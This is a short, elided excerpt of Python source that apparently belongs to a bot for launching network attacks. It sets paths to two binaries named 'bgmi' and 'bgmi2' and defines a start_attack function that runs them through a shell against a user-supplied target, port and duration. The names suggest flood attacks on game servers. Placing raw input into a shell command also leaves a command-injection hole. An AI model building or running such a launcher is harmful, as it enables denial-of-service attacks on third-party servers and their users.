...
ORIGINAL_BGMI_PATH = '/workspaces/RB/bgmi'  
ORIGINAL_RANDOM_PATH = '/workspaces/RB/bgmi2' 
...
def start_attack(user_id, target, port, duration):
    ...
    try:
        ongoing_attacks[attack_id] = subprocess.Popen(f"./{bgmi_file} {target} {port} {duration} 15", shell=True)
        time.sleep(5)
        subprocess.run(f"./{random_file} {target} {port} {duration} 20", shell=True)
